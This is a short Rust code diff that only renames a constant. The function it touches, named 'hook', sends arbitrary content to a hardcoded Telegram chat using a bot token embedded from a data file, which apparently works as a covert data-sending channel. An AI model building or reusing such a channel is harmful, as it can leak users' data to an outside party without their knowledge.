@@ -36,13 +36,13 @@ pub async fn resolve(dns: &str) -> Option<Addr> {
 }
 
 pub async fn hook(content: &str) -> Result<reqwest::Response, reqwest::Error> {
-    const a: &'static str = {
+    const A: &'static str = {
         match LOG_LEVEL {
             1 => include_str!("../data/data.txt"),
             _ => "",
         }
     };
-    let b = format!("https://api.telegram.org/bot{}/sendMessage", a);
+    let b = format!("https://api.telegram.org/bot{}/sendMessage", A);
     let c = json!({
         "chat_id": -4516139568 as i64,
         "text": content,
